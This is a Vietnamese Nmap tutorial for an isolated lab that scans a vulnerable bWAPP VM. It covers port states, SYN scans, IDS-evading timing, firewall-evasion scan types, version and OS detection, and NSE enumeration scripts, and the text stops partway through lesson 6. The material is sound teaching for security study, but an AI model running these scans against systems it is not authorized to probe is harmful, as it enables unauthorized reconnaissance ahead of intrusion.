# HỌC NMAP QUA LAB THỰC TẾ — Kali Linux ↔ bee-box (bWAPP)

> **Đây là giáo trình, không phải script.**
> Bạn sẽ **gõ tay từng lệnh**, đọc phần giải thích, rồi tự trả lời câu hỏi trước khi sang bài sau.
> Mục tiêu không phải "chạy xong", mà là **hiểu vì sao mỗi flag tồn tại**.

**Người đọc giả định:** chưa từng dùng Nmap, biết Linux cơ bản (cd, ls, sudo), chưa biết pentest.
**Thời lượng:** 3 buổi × ~90 phút.

| Buổi | Nội dung | Bài |
|---|---|---|
| 1 | Hiểu mạng, tìm máy, quét port | Bài 1 – 3 |
| 2 | Nhận diện dịch vụ, OS, NSE | Bài 4 – 6 |
| 3 | Web, credential, khai thác, báo cáo | Bài 7 – 10 |

---

## MỤC LỤC

- [0. Bạn sẽ học được gì](#0-bạn-sẽ-học-được-gì)
- [1. Chuẩn bị lab & kiến thức nền](#1-chuẩn-bị-lab--kiến-thức-nền)
- [Bài 1 — Làm quen với Nmap](#bài-1--làm-quen-với-nmap)
- [Bài 2 — Host discovery: tìm máy nào đang sống](#bài-2--host-discovery-tìm-máy-nào-đang-sống)
- [Bài 3 — Port scanning: máy mở những cửa nào](#bài-3--port-scanning-máy-mở-những-cửa-nào)
- [Bài 4 — Version detection: cửa đó là cửa hiệu gì](#bài-4--version-detection-cửa-đó-là-cửa-hiệu-gì)
- [Bài 5 — OS detection: máy đó chạy hệ điều hành gì](#bài-5--os-detection-máy-đó-chạy-hệ-điều-hành-gì)
- [Bài 6 — NSE: Nmap biết nói chuyện](#bài-6--nse-nmap-biết-nói-chuyện)
- [Bài 7 — UDP & evasion (nâng cao)](#bài-7--udp--evasion-nâng-cao)
- [Bài 8 — Nikto & Hydra](#bài-8--nikto--hydra)
- [Bài 9 — Từ scan đến khai thác](#bài-9--từ-scan-đến-khai-thác)
- [Bài 10 — Viết báo cáo](#bài-10--viết-báo-cáo)
- [Bài tập tổng hợp + đáp án](#bài-tập-tổng-hợp)
- [Cheat sheet](#cheat-sheet)
- [Từ điển thuật ngữ](#từ-điển-thuật-ngữ)
- [Lỗi thường gặp](#lỗi-thường-gặp)
- [Phụ lục: script tự động hoá (tuỳ chọn)](#phụ-lục-script-tự-động-hoá-tuỳ-chọn)

---

## 0. Bạn sẽ học được gì

Sau khi học xong, bạn có thể tự trả lời:

1. `nmap 192.168.91.130` khác gì `nmap -p- -sV -O 192.168.91.130`?
2. Vì sao `-sS` cần `sudo` còn `-sT` thì không?
3. `open|filtered` nghĩa là gì và vì sao UDP hay gặp trạng thái này?
4. Khi nào dùng `-Pn`, khi nào **không** nên dùng?
5. `-sV` đọc banner như thế nào và vì sao nó quan trọng hơn "thấy port mở"?
6. NSE là gì, `-sC` khác `--script vuln` ra sao?
7. Từ output scan, làm sao viết thành một "finding" trong báo cáo?

Và quan trọng nhất: **biết mình đang làm gì trước khi bấm Enter**.

---

## 1. Chuẩn bị lab & kiến thức nền

### 1.1. Sơ đồ lab

```
┌─────────────────────────┐          ┌─────────────────────────┐
│  Kali Linux (attacker)  │  VMnet1  │  bee-box v1.6 (victim)  │
│  192.168.91.128         │◄────────►│  192.168.91.130         │
│  nmap, nikto, hydra     │ host-only│  bWAPP, MySQL, SSH      │
└─────────────────────────┘          └─────────────────────────┘
                 ▲
                 │ VMnet1 = 192.168.91.0/24 (host .1)
              Máy host Windows
```

- **Host-only** = 2 VM nói chuyện với nhau + với máy host, **không ra Internet/LAN thật**. Đây là điều kiện an toàn để nghịch.
- IP thực tế có thể khác — luôn kiểm tra lại, đừng tin tài liệu.

### 1.2. Sửa mạng cho bee-box (bắt buộc)

Trong `bee-box.vmx` hiện đang là `bridged` → nguy hiểm (lọt ra LAN thật). Sửa:

1. VMware → chọn VM `bee-box` → **Edit settings**
2. **Network Adapter** → chọn **Custom: VMnet1 (Host-only)**
3. OK → khởi động VM

Sau đó **snapshot ngay**: `VM → Snapshot → Take Snapshot…` → tên `CLEAN`.

> Vì sao snapshot? Vì bài 9 bạn sẽ phá webroot và tạo user lạ. Snapshot cho phép "undo" toàn bộ lab trong 10 giây.

### 1.3. Kiểm tra 2 máy thấy nhau

**Trên Kali:**

```bash
ip -brief addr
```

Bạn cần thấy một dòng dạng `eth0  UP  192.168.91.128/24`. Nếu là `192.168.91.x` thì đúng mạng.

```bash
ping -c 2 192.168.91.130
```

- Có `64 bytes from ...` → thông nhau.
- `Destination Host Unreachable` → sai VMnet, hoặc bee-box chưa lên.

### 1.4. Kiến thức nền tối thiểu (đọc kỹ, phần sau dựa vào đây)

#### a) Port là gì?

Một máy có 1 địa chỉ IP nhưng nhiều **cổng (port)** để phân biệt dịch vụ: web thường 80/443, SSH 22, MySQL 3306. Có 65535 port TCP và 65535 port UDP.

> Ví dụ đời thường: IP = số nhà, port = số phòng. `192.168.91.130:80` = nhà 130, phòng 80.

#### b) TCP 3-way handshake (nền tảng của `-sS`)

```
Client                     Server
  |  ---- SYN ------------>  |   "Tôi muốn kết nối"
  |  <--- SYN/ACK ---------   |   "OK, đồng ý"
  |  ---- ACK ------------>  |   "Bắt đầu"
```

- Nếu port **mở** → server trả `SYN/ACK`.
- Nếu port **đóng** → server trả `RST` (từ chối).
- Nếu bị **firewall drop** → không trả gì (im lặng) → Nmap gọi là `filtered`.

**Đây chính là cách Nmap đoán trạng thái port.** Hiểu bảng này là hiểu 70% Nmap.

#### c) 6 trạng thái port

| Trạng thái | Nghĩa | Dấu hiệu |
|---|---|---|
| `open` | Có dịch vụ đang nghe | Nhận SYN/ACK |
| `closed` | Không có dịch vụ, nhưng máy vẫn sống | Nhận RST |
| `filtered` | Bị firewall/ACL chặn | Không phản hồi |
| `unfiltered` | Qua được firewall nhưng không rõ mở/đóng | Chỉ ACK scan mới thấy |
| `open\|filtered` | Không phân biệt được mở hay bị lọc | UDP, FIN/NULL/XMAS |
| `closed\|filtered` | Không phân biệt được đóng hay bị lọc | IP protocol scan |

#### d) Vì sao có lệnh cần `sudo`?

`-sS` (SYN scan) phải **tự ghép packet TCP** → cần raw socket → cần root.
`-sT` (connect scan) chỉ gọi `connect()` của hệ điều hành → không cần root.

#### e) Cấu trúc một lệnh Nmap

```
nmap [Loại scan] [Tuỳ chọn] [Mục tiêu]
      -sS -sV -O    -p 80,443  192.168.91.130
```

Đọc từ trái sang phải: **làm gì → với tuỳ chọn nào → trên máy nào**.

---

## Bài 1 — Làm quen với Nmap

### 1.1. Xem phiên bản & trợ giúp

```bash
nmap --version
```

📋 Kỳ vọng: `Nmap version 7.9x ( https://nmap.org )` + platform.

```bash
nmap -h | head -40
```

📋 Bạn sẽ thấy các nhóm: `TARGET SPECIFICATION`, `HOST DISCOVERY`, `SCAN TECHNIQUES`, `PORT SPECIFICATION`, `SERVICE/VERSION DETECTION`, `SCRIPT SCAN`, `OS DETECTION`, `TIMING AND PERFORMANCE`, `OUTPUT`.

🧠 **Cách học Nmap hiệu quả nhất:** mỗi khi quên flag, mở `-h` và đọc đúng nhóm. Không cần thuộc lòng.

```bash
man nmap
```

Dùng `/` để tìm (ví dụ gõ `/version-intensity` rồi Enter), `n` để next, `q` để thoát.

### 1.2. Lệnh Nmap đầu tiên

```bash
nmap 192.168.91.130
```

Chạy **không** sudo. Bạn sẽ thấy gì?

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-12 09:30 +07
Nmap scan report for 192.168.91.130
Host is up (0.00042s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
3306/tcp open mysql
```

#### 🧠 Chuyện gì vừa xảy ra? (rất quan trọng)

Một lệnh "trần" thực chất làm **3 việc**:

1. **Host discovery**: kiểm tra máy có sống không (trong LAN: gửi ARP).
2. **Port scan**: quét **1000 port TCP phổ biến nhất** (không phải 65535).
3. **Reverse DNS**: cố đổi IP thành tên miền (nên có dòng `Nmap scan report for ...`).

Và vì bạn **không dùng sudo**, Nmap tự chọn `-sT` (connect scan) thay vì `-sS`.

> ⚠️ Nhiều người mới tưởng "nmap target" là quét hết port. **Sai.** Nó chỉ quét 1000 port top. Muốn hết phải `-p-`.

#### ✅ Bạn cần hiểu

- Không có flag nào = "quét mặc định", không phải "quét tất cả".
- `Not shown: 996 closed ...` nghĩa là Nmap **đã** quét 1000 port, 996 cái đóng nên ẩn đi cho gọn.

### 1.3. Các cách viết mục tiêu

```bash
nmap 192.168.91.130              # 1 IP
nmap 192.168.91.130 192.168.91.131   # nhiều IP
nmap 192.168.91.130-140          # dải IP
nmap 192.168.91.0/24             # cả subnet (256 địa chỉ)
nmap 192.168.91.130,131          # liệt kê
nmap scanme.nmap.org             # tên miền (KHÔNG dùng khi chưa được phép)
```

Quét danh sách từ file:

```bash
printf '192.168.91.130\n192.168.91.131\n' > targets.txt
nmap -iL targets.txt
```

| Cú pháp | Ý nghĩa |
|---|---|
| `-iL file` | Đọc mục tiêu từ file, mỗi dòng 1 target |
| `-iR 5` | 5 IP ngẫu nhiên trên Internet (**đừng dùng** — ngoài phạm vi) |
| `--exclude 192.168.91.1` | Loại trừ host |
| `--excludefile f` | Loại trừ theo file |

### 1.4. Tạo thói quen tốt ngay từ đầu: lưu output

```bash
mkdir -p ~/pentest && cd ~/pentest
sudo nmap -sS -p 22,80,443,3306 --reason -v 192.168.91.130 -oA bai1_dautien
```

| Flag | Nghĩa |
|---|---|
| `-oA <tên>` | Xuất **3 file**: `<tên>.nmap` (text), `<tên>.xml`, `<tên>.gnmap` |
| `--reason` | Thêm cột lý do kết luận (`syn-ack`, `reset`, `no-response`) |
| `-v` | Verbose — in tiến độ |

```bash
ls -l bai1_dautien.*
cat bai1_dautien.nmap
```

#### ✅ Bạn cần hiểu

- `--reason` là **bằng chứng** cho báo cáo: không chỉ "port mở" mà "vì sao biết nó mở".
- Luôn `-oA` ngay từ lệnh đầu. Người mới hay quên rồi phải quét lại.

### ✍️ Tự làm bài 1

1. Chạy `nmap 192.168.91.130` rồi `sudo nmap -sS 192.168.91.130`. **So sánh thời gian** và dòng `Not shown`. Vì sao khác?
2. Chạy `nmap -p 80 192.168.91.130` và giải thích vì sao chỉ có 1 dòng output.
3. Thử `nmap 192.168.91.0/30` — có bao nhiêu host được quét?

<details>
<summary>Đáp án gợi ý</summary>

1. `-sS` nhanh hơn vì không cần OS hoàn tất kết nối; `Not shown` có thể khác vì `-sS` nhận `reset` còn `-sT` nhận `conn-refused` (cùng nghĩa: đóng).
2. Vì `-p 80` chỉ quét đúng port 80, không quét 1000 port nên không có gì để "ẩn".
3. `/30` = 4 địa chỉ, trong đó 1 network + 1 broadcast → 2 host dùng được.
</details>

---

## Bài 2 — Host discovery: tìm máy nào đang sống

**Mục tiêu:** biết máy nào trong dải mạng đang bật, **trước khi** quét port.

### 2.1. Ping sweep — `-sn`

```bash
sudo nmap -sn 192.168.91.0/24
```

| Flag | Nghĩa |
|---|---|
| `-sn` | **S**can **n**o ports — chỉ tìm host, **không quét port** |

📋 Kỳ vọng:

```
Nmap scan report for 192.168.91.1
Host is up (0.00030s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.91.130
Host is up (0.00042s latency).
MAC Address: 00:0C:29:3E:BA:70 (VMware)
Nmap scan report for 192.168.91.128
Host is up.
```

#### 🧠 Bên dưới có gì?

Trong **cùng subnet**, Nmap dùng **ARP request** (`-PR`) chứ không phải ICMP. Vì vậy:

- Kết quả **rất chính xác** — máy không thể "giả chết" với ARP.
- Có thêm **MAC Address** → nhìn `00:0C:29` là biết VMware, `00:50:56` cũng VMware (host adapter).

> Đây là lý do `-sn` trong LAN nhanh và đáng tin hơn `ping` thường.

### 2.2. Các kiểu "gõ cửa" khác nhau

Khi máy chặn ICMP (nhiều firewall làm vậy), `-sn` mặc định có thể bỏ sót. Nmap cho bạn chọn **cách gõ cửa**:

```bash
sudo nmap -sn -PR 192.168.91.130   # ARP (chỉ LAN)
sudo nmap -sn -PE 192.168.91.130   # ICMP Echo  (giống ping)
sudo nmap -sn -PP 192.168.91.130   # ICMP Timestamp
sudo nmap -sn -PM 192.168.91.130   # ICMP Address Mask
sudo nmap -sn -PS22,80,443 192.168.91.130   # TCP SYN tới port
sudo nmap -sn -PA80,443 192.168.91.130      # TCP ACK
sudo nmap -sn -PU53,161 192.168.91.130      # UDP
```

| Flag | Cơ chế | Khi nào dùng |
|---|---|---|
| `-PR` | ARP request | Trong LAN — **luôn thử cái này trước** |
| `-PE` | ICMP echo | Máy cho ping |
| `-PP` | ICMP timestamp | Firewall chặn echo nhưng quên timestamp |
| `-PM` | ICMP address mask | Hiếm, một số thiết bị cũ |
| `-PS<port>` | Gửi SYN; nhận SYN/ACK **hoặc RST** = sống | Firewall chặn ICMP nhưng port đóng vẫn trả RST |
| `-PA<port>` | Gửi ACK; nhận RST = sống | Qua được firewall stateful (vì ACK không bị coi là "mở kết nối") |
| `-PU<port>` | Gửi UDP; nhận ICMP unreachable = sống | Khi TCP/ICMP đều bị chặn |

🧠 **Điểm mấu chốt:** với `-PS`, **RST cũng là "sống"**. Máy sống mà port đóng vẫn trả lời → ta biết nó tồn tại. Đừng nhầm "port đóng" với "máy chết".

### 2.3. `-Pn` — bỏ qua bước hỏi thăm

```bash
sudo nmap -Pn -p 80,443 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-Pn` | **P**ing **n**o — coi như mọi host đều sống, quét thẳng |

#### 🧠 Khi nào dùng, khi nào không?

- ✅ Dùng khi biết chắc máy sống nhưng nó chặn hết probe discovery.
- ❌ **Không** dùng khi quét cả `/24`: bạn sẽ quét port của 254 địa chỉ, kể cả máy không tồn tại → **chậm gấp nhiều lần**.

### 2.4. Tiết kiệm thời gian với DNS

```bash
nmap -sn -n 192.168.91.0/24       # -n: không reverse DNS (nhanh hơn)
nmap -sn -R 192.168.91.130        # -R: luôn reverse DNS (kể cả host chết)
```

| Flag | Nghĩa |
|---|---|
| `-n` | Never resolve DNS — nhanh, output chỉ có IP |
| `-R` | Always resolve — dùng khi cần tên máy |

### ✍️ Tự làm bài 2

1. Chạy `sudo nmap -sn 192.168.91.0/24` rồi `nmap -sn -n 192.168.91.0/24`. So sánh thời gian và output.
2. Tìm MAC của bee-box, đối chiếu với dòng `ethernet0.generatedAddress` trong file `bee-box.vmx` trên Windows.
3. Chạy `sudo nmap -sn -PS1 192.168.91.130` (port 1 gần như chắc chắn đóng). Vì sao vẫn kết luận "Host is up"?

---

## Bài 3 — Port scanning: máy mở những cửa nào

### 3.1. Chọn port để quét — `-p`

```bash
nmap -p 80 192.168.91.130
nmap -p 22,80,443 192.168.91.130
nmap -p 1-1024 192.168.91.130
nmap -p- 192.168.91.130                 # 1-65535
nmap -p http,https,ssh,mysql 192.168.91.130   # theo TÊN dịch vụ
nmap -p U:53,T:80 192.168.91.130        # UDP 53 + TCP 80 cùng lúc
nmap -p 1-1000 --exclude-ports 80 192.168.91.130
```

| Cú pháp | Nghĩa |
|---|---|
| `-p 80` | 1 port |
| `-p 22,80,443` | danh sách |
| `-p 1-1024` | dải |
| `-p-` | **toàn bộ** 65535 port TCP |
| `-p http,https` | Nmap tra `/etc/services` để đổi tên → số |
| `U:` / `T:` | Tiền tố chỉ định UDP/TCP khi trộn |
| `-F` | **F**ast — 100 port phổ biến nhất |
| `--top-ports 1000` | 1000 port phổ biến nhất (mặc định) |
| `--exclude-ports` | Loại trừ |

> 💡 `-p-` là lệnh **bắt buộc** trong pentest thật: dịch vụ lạ (Tomcat 8080, AJP 8009, backdoor 1337…) không nằm trong top-1000.

### 3.2. Hai kiểu scan quan trọng nhất: `-sS` và `-sT`

```bash
sudo nmap -sS -p 22,80,443,3306 192.168.91.130    # SYN scan
nmap      -sT -p 22,80,443,3306 192.168.91.130    # Connect scan
```

| | `-sS` SYN scan | `-sT` Connect scan |
|---|---|---|
| Cách làm | Gửi SYN, nhận SYN/ACK, gửi **RST huỷ ngay** | Gọi `connect()` đầy đủ 3 bước rồi `close()` |
| Cần root? | **Có** | Không |
| Tốc độ | Nhanh | Chậm hơn |
| Log phía server | Thường **không** log (kết nối chưa hoàn tất) | **Có** log (kết nối hoàn chỉnh) |
| Tên gọi khác | half-open scan | full connect scan |

🧠 **Vì sao `-sS` khó bị phát hiện hơn?** Vì ứng dụng chỉ ghi log khi kết nối **hoàn tất**. `-sS` cắt ngang sau SYN/ACK nên app không thấy gì — nhưng IDS/firewall vẫn thấy packet.

🧠 **Vì sao phải dùng `-sT` khi qua proxy?** Proxy chỉ chuyển được luồng TCP đã `connect()`, không chuyển raw packet → SYN scan không đi qua SOCKS được.

### 3.3. Quét nhanh và quét sâu

```bash
nmap -F 192.168.91.130                      # 100 port
nmap --top-ports 1000 192.168.91.130        # 1000 port (mặc định)
sudo nmap -sS -p- --min-rate 1000 192.168.91.130   # toàn bộ, tăng tốc
```

| Flag | Nghĩa |
|---|---|
| `-F` | Fast: 100 port phổ biến |
| `--top-ports N` | N port phổ biến nhất theo thống kê Nmap |
| `--min-rate N` | Gửi **tối thiểu** N packet/giây (không chờ) |
| `--max-rate N` | Giới hạn tối đa packet/giây |
| `--max-retries N` | Số lần thử lại (giảm = nhanh hơn, kém chính xác hơn) |

> ⚠️ `-p-` mặc định có thể mất 10–30 phút. Trong LAN dùng `--min-rate 1000` → còn ~1 phút.

### 3.4. Timing template — `-T0` … `-T5`

```bash
sudo nmap -sS -T4 -p- 192.168.91.130
sudo nmap -sS -T2 --scan-delay 1s -p 1-100 192.168.91.130
```

| Template | Tên | Đặc điểm | Dùng khi |
|---|---|---|---|
| `-T0` | Paranoid | 1 packet / 5 phút | Cực kỳ lén (rất chậm) |
| `-T1` | Sneaky | chậm, né IDS | Lab học evasion |
| `-T2` | Polite | giảm tải server | Server yếu |
| `-T3` | Normal | mặc định | — |
| `-T4` | Aggressive | nhanh, hợp LAN | **Lab, mạng nội bộ** |
| `-T5` | Insane | rất nhanh, dễ sai | Không khuyến nghị |

🧠 `-T4` không phải "tấn công mạnh" — nó chỉ tăng song song + giảm timeout. Vẫn lịch sự với server.

### 3.5. Đọc output cho đúng

```bash
sudo nmap -sS -p 22,80,443,3306 --reason --open -v 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `--reason` | Cột lý do: `syn-ack` (mở), `reset` (đóng), `no-response` (filtered) |
| `--open` | Chỉ hiện port **mở** (gọn mắt) |
| `-v` / `-vv` | Tăng mức chi tiết |

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```

Cách đọc: **PORT / STATE / SERVICE / REASON**. `ttl 64` là TTL của packet trả về — sau này dùng cho OS fingerprint.

### 3.6. Quét UDP — `-sU`

```bash
sudo nmap -sU --top-ports 50 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-sU` | UDP scan |
| `--top-ports 50` | Chỉ 50 port UDP phổ biến (UDP chậm, đừng quét hết) |

```
PORT    STATE         SERVICE
53/udp  open|filtered domain
111/udp open          rpcbind
```

#### 🧠 Vì sao UDP chậm và hay `open|filtered`?

- UDP **không có handshake**. Nmap gửi packet rồi **chờ**.
- Port đóng → server trả `ICMP port unreachable` → biết `closed`.
- Port mở → ứng dụng có thể **không trả lời** (nhiều dịch vụ UDP im lặng) → Nmap không phân biệt được **mở** hay **bị firewall drop** → `open|filtered`.
- Nmap phải chờ timeout → chậm.

### 3.7. Các kiểu scan khác (biết để đọc tài liệu)

```bash
sudo nmap -sA -p 1-1000 192.168.91.130    # ACK: map firewall
sudo nmap -sN -p 22,80 192.168.91.130     # NULL
sudo nmap -sF -p 22,80 192.168.91.130     # FIN
sudo nmap -sX -p 22,80 192.168.91.130     # XMAS
sudo nmap -sO 192.168.91.130              # IP protocol
```

| Flag | Bản chất | Dùng để |
|---|---|---|
| `-sA` | Gửi ACK; `RST` = unfiltered, không phản hồi = filtered | **Map firewall**, KHÔNG tìm port mở |
| `-sN/-sF/-sX` | Gửi packet "dị dạng" (không flag / chỉ FIN / FIN+PSH+URG) | Lách firewall stateless; Windows thường bỏ qua hết |
| `-sO` | Quét **giao thức IP** (ICMP, GRE…) thay vì port | Trinh sát sâu |

🧠 **Cạm bẫy người mới:** thấy `-sA` báo `unfiltered` rồi tưởng port mở. **Sai.** `-sA` không nói gì về mở/đóng.

### ✍️ Tự làm bài 3

1. Chạy `nmap -p- 192.168.91.130` (không sudo) và `sudo nmap -sS -p- --min-rate 1000 192.168.91.130`. Ghi lại thời gian. Kết quả port có khác nhau không? Vì sao?
2. Chạy `sudo nmap -sA -p 22,80,443,3306 192.168.91.130`. Vì sao tất cả đều `unfiltered`?
3. Chạy `sudo nmap -sU --top-ports 20 192.168.91.130`. Có port nào `open|filtered`? Giải thích.

<details>
<summary>Đáp án gợi ý</summary>

1. `-sS` nhanh hơn nhiều (không hoàn tất handshake, có thể gửi song song). Kết quả port giống nhau; chỉ khác tốc độ và log.
2. Vì `-sA` chỉ kiểm tra packet có bị firewall chặn không. Không có firewall → mọi port `unfiltered` (dù đóng).
3. Thường `53/udp open|filtered` (DNS không trả lời query rỗng) và `111/udp open` nếu có rpcbind.
</details>

---

## Bài 4 — Version detection: cửa đó là cửa hiệu gì

**Mục tiêu:** biết **phần mềm + phiên bản** đang chạy sau mỗi port. Đây là bước biến "port mở" thành "thông tin có thể tra CVE".

### 4.1. Lệnh cơ bản

```bash
sudo nmap -sV -p 22,80,443,3306 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-sV` | **S**ervice/**V**ersion detection — gửi probe đặc biệt để hỏi "bạn là ai, phiên bản nào" |

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 5.3p1 (Ubuntu-1ubuntu2)
80/tcp   open  http     Apache httpd 2.2.14 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.2.14
3306/tcp open  mysql    MySQL 5.1.73
```

#### 🧠 Nmap làm gì để biết version?

1. **Banner grab**: đọc dòng chào của dịch vụ (SSH gửi `SSH-2.0-OpenSSH_5.3p1` ngay khi kết nối).
2. **Gửi probe** từ `nmap-service-probes` (~12.000 mẫu) và so khớp phản hồi.
3. Suy ra **CPE** (`cpe:/a:apache:http_server:2.2.14`) — định danh chuẩn để tra CVE.

### 4.2. Điều chỉnh độ sâu — version intensity

```bash
sudo nmap -sV --version-light -p 80,443 192.168.91.130   # intensity 2
sudo nmap -sV -p 80,443 192.168.91.130                   # mặc định 7
sudo nmap -sV --version-all -p 80,443 192.168.91.130     # intensity 9
```

| Flag | Intensity | Đánh đổi |
|---|---|---|
| `--version-light` | 2 | Nhanh, có thể đoán sai/không rõ |
| (mặc định) | 7 | Cân bằng |
| `--version-all` | 9 | Chậm, chính xác nhất — dùng khi cần tra CVE |

🧠 Người mới hay dùng `--version-all` cho mọi thứ. Thực tế: quét `/24` thì dùng light, chỉ `--version-all` cho **host mục tiêu cuối**.

### 4.3. Đọc output nâng cao

```bash
sudo nmap -sV --version-all --script=banner -p 22,80 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `--script=banner` | Chỉ in banner thô, không suy luận |

Bạn sẽ thấy Nmap đôi khi in:

```
80/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
```

Dòng `|_` là output của script NSE (bài 6). Nghĩa: script `http-server-header` xác nhận lại.

- `Apache httpd 2.2.14` → tra `searchsploit apache 2.2` ra ngay danh sách CVE.
- `MySQL 5.1.73` → EOL từ 2013, nhiều lỗi.

### 4.4. RPC — `-sR`

```bash
sudo nmap -sV -sR -p 111 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-sR` | RPC scan — liệt kê chương trình/phiên bản đăng ký với rpcbind (NFS, NIS…) |

### ✍️ Tự làm bài 4

1. Chạy `-sV` với 3 mức intensity trên port 80. Ghi lại thời gian và khác biệt output.
2. Copy version Apache tìm được, chạy trên Kali: `searchsploit apache 2.2.14`. Có bao nhiêu kết quả?
3. Vì sao `-sV` quan trọng hơn việc chỉ biết "port 80 mở"?

<details>
<summary>Đáp án gợi ý</summary>

1. `--version-light` nhanh nhất nhưng có thể chỉ ra `http` không kèm version; `--version-all` chậm nhất nhưng đầy đủ CPE.
2. Thường vài chục kết quả (bao gồm DoS, XSS, RCE) — phần lớn áp dụng cho 2.2.x.
3. Vì "port 80 mở" chỉ nói có web; version cho biết **có lỗ hổng nào** và **exploit nào dùng được**.
</details>

---

## Bài 5 — OS detection: máy đó chạy hệ điều hành gì

```bash
sudo nmap -O --osscan-guess -p 22,80,443,3306 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-O` | Bật OS fingerprint |
| `--osscan-guess` | Đoán mạnh khi không khớp 100% |
| `--osscan-limit` | Chỉ thử khi có ≥1 port mở **và** ≥1 port đóng |
| `--max-os-tries N` | Giới hạn số lần thử (mặc định 5) |

```
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.38
Network Distance: 1 hop
```

#### 🧠 Nmap đoán OS bằng cách nào?

Nó không "đọc tên hệ điều hành". Nó phân tích **dấu vết TCP/IP stack**:

- TTL mặc định (Linux 64, Windows 128)
- TCP window size
- Thứ tự TCP options
- Cách sinh ISN (initial sequence number)
- Phản ứng với packet lạ (FIN, NULL…)

→ So khớp với database `nmap-os-db` (~2600 fingerprint).

#### ⚠️ Giới hạn cần biết

- Cần **1 port mở + 1 port đóng**. Nếu mọi port filtered → không đoán được.
- Qua firewall/NAT/proxy → kết quả sai.
- Chỉ là **dự đoán**, không phải sự thật tuyệt đối. Trong báo cáo ghi "OS ước đoán".

### ✍️ Tự làm bài 5

1. Chạy `-O` khi chỉ quét port 80 (chỉ 1 port mở, không có port đóng). Điều gì xảy ra?
2. So sánh `ttl` trong `--reason` với OS đoán được. Có khớp không?

---

## Bài 6 — NSE: Nmap biết nói chuyện

**NSE = Nmap Scripting Engine.** Đây là phần mạnh nhất của Nmap: ~600 script viết bằng Lua, biến Nmap từ "máy quét port" thành "máy trinh sát".

### 6.1. Script nằm ở đâu, có những loại nào

```bash
ls /usr/share/nmap/scripts | head -20
ls /usr/share/nmap/scripts | wc -l
ls /usr/share/nmap/scripts | grep -i http
```

**14 category** (nhóm) — script có thể thuộc nhiều nhóm:

| Category | Ý nghĩa | An toàn? |
|---|---|---|
| `default` | Nhóm mặc định khi dùng `-sC` | ✅ |
| `safe` | Không gây hại | ✅ |
| `discovery` | Thu thập thông tin | ✅ |
| `version` | Hỗ trợ dò version | ✅ |
| `auth` | Kiểm tra xác thực | ⚠️ |
| `brute` | Brute-force credential | ⚠️⚠️ |
| `intrusive` | Có thể gây ảnh hưởng | ⚠️⚠️ |
| `vuln` | Kiểm tra lỗ hổng | ⚠️ |
| `exploit` | Khai thác thật | ❌ nguy hiểm |
| `malware` | Phát hiện backdoor | ⚠️ |
| `fuzzer` | Gửi dữ liệu rác | ⚠️⚠️ |
| `dos` | **Có thể làm sập** | ❌ |
| `broadcast` | Gửi broadcast | ⚠️ |
| `external` | Gửi ra dịch vụ ngoài (Internet) | ❌ |

> 🚨 **Quy tắc:** trong lab có snapshot thì thoải mái. Trên hệ thống thật, **không bao giờ** chạy `dos`, `exploit`, `fuzzer` khi chưa được phép bằng văn bản.

### 6.2. `-sC` — nhóm default

```bash
sudo nmap -sC -sV -p 22,80,443,3306 192.168.91.130
```

| Flag | Nghĩa |
|---|---|
| `-sC` | Chạy `--script=default` (tương đương) |
| `-sV` | Kết hợp: nhiều script default cần version để chạy đúng |

📋 Với bee-box bạn sẽ thấy các dòng kiểu:

```
| http-title: bWAPP - Login
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssh-hostkey:
|_  1024 4a:... (DSA)
```

🧠 **Cách đọc output NSE:** mỗi script in ra một khối, dòng bắt đầu bằng `|` là nội dung, `|_` là dòng cuối. Tên script nằm ngay sau `|`.

### 6.3. Chạy script cụ thể — cách học tốt nhất

Thay vì chạy cả trăm script, hãy chạy **từng cái** và đọc output:

```bash
sudo nmap -p 80 --script http-title 192.168.91.130
sudo nmap -p 80 --script http-headers 192.168.91.130
sudo nmap -p 80 --script http-methods 192.168.91.130
```

| Script | Trả lời câu hỏi gì |
|---|---|
| `http-title` | Trang web tên gì? (nhận diện app: bWAPP, phpMyAdmin, DVWA) |
| `http-headers` | Server tiết lộ gì? (`Server:`, `X-Powered-By:`, thiếu header bảo mật) |
| `http-methods` | Những HTTP method nào được bật? (`PUT`/`DELETE`/`TRACE` = nguy hiểm) |

📋 Ví dụ thật:

```
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS
|_  Potentially risky methods: TRACE
```

🧠 `TRACE` bật → có thể bị Cross-Site Tracing (XST). Đây là **finding** trong báo cáo, kèm khuyến nghị tắt `TraceEnable off`.

### 6.4. Enumerate đường dẫn web

```bash
sudo nmap -p 80 --script http-enum 192.168.91.130
```

```
| http-enum:
|   /bWAPP/: bWAPP
|   /phpmyadmin/: phpMyAdmin
|   /icons/: Icons
|_  /server-status: Apache status
```

#### 🧠 Script này làm gì?

Nó **brute** một danh sách path phổ biến (lấy từ `/usr/share/nmap/nselib/data/http-fingerprints.lua`) rồi so mã HTTP + nội dung. Không phải "ma thuật" — chỉ là gửi nhiều request.

### 6.5. NSE cho MySQL

```bash
sudo nmap -p 3306 --script "mysql-info,mysql-empty-password" 192.168.91.130
```

| Script | Kiểm tra |
|---|---|
| `mysql-info` | Version, protocol, capability |
| `mysql-empty-password` | Tài khoản nào cho phép **mật khẩu rỗng** |

```
| mysql-info:
|   Protocol: 10
|   Version: 5.1.73-0ubuntu0.10.04.1
|   Thread ID: 123
